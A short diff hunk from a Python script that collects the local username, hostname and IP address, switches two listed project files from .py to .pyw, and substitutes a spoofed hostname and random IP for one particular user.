@@ -15,7 +15,7 @@ pcuser=os.environ['username']
 hostname=socket.gethostname()
 IPA=socket.gethostbyname(hostname)
 
-projects = ["kopier.py", "liv.py"]
+projects = ["kopier.pyw", "liv.pyw"]
 if pcuser=="PVER":
 	hostname="Linux_Kali_Vmw4GB"
 	IPA=f"192.{random.choice([69, 420])}.{random.randrange(1, 98, 1)}.{random.randrange(1, 98, 1)}"
